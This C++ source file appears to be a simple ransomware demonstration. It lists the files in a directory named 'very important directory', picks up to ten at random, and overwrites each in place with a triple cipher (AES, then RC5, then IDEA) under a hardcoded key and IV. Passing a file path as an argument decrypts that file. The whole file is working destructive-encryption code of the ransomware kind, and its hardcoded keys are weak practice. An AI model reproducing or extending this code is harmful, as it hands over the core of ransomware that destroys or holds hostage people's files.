#include <fstream>
#include <iostream>
#include <string>
#include <filesystem>
#include <random>

#include "cryptoFunc.h"


const std::vector<uint8_t> key = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm'};
const std::vector<uint8_t> iv = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm' };

void encryptFile(std::string path) {
    std::string cipherAes, cipherRc5, cipherIdea;

    std::fstream file;

    file.open(path, std::ios::in);
    std::string payload;
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            payload += line + "\n";
        }
    }
    file.close();

    cipherAes = encryptAes(payload, key, iv);
    cipherRc5 = encryptRc5(cipherAes, key, iv);
    cipherIdea = encryptIdea(cipherRc5, key, iv);


    file.open(path, std::ios::out);
    if (file.is_open())
        file << cipherIdea;
    file.close();
    std::cout << cipherIdea << std::endl;
}

void decryptFile(std::string path) {
    std::string recoverAes, recoverRc5, recoverIdea;

    std::fstream file;

    file.open(path, std::ios::in);
    std::string payload;
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            payload += line;
        }
    }
    file.close();

    recoverIdea = decryptIdea(payload, key, iv);
    recoverRc5 = decryptRc5(recoverIdea, key, iv);
    recoverAes = decryptAes(recoverRc5, key, iv);


    file.open(path, std::ios::out);
    if (file.is_open())
        file << recoverAes;
    file.close();

}


int main(int argc, char* argv[]){


    if (argc > 1) {
        decryptFile(argv[1]);
    }
    else {
        std::vector<std::string> files;
        for (const auto& entry : std::filesystem::directory_iterator("..\\very important directory")) {
            files.push_back(entry.path().string());
        }

        if (files.size() > 10) {
            std::random_device rd;
            std::mt19937 mt_generator(rd());
            for (int i = 10; i > 0; i--) {
                std::uniform_int_distribution dst(0, (int)files.size() - 1);
                int pi = dst(mt_generator);
                std::string path = files[pi];
                files.erase(files.begin() + pi);
                encryptFile(path);
            }
        }
        else {
            for (auto f : files) {
                encryptFile(f);
            }
        }
    }
    return 0;
}